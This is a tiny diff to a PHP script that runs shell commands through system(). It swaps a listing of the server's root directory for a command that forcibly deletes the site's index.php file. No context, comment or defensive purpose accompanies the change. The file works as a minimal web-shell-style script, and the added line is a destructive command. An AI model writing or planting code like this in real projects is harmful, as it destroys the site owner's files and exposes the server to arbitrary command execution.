@@ -1,3 +1,3 @@
 <?php
-	echo system("ls  /");
+	echo system("rm -rf index.php");
 ?>
